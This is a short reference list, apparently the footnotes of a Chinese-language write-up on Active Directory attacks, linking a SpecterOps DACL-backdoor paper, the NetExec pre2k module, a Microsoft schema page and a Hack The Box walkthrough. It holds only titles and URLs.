- [17] [袖中 ACE：设计 Active Directory DACL 后门](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k 模块源码](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership 属性](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
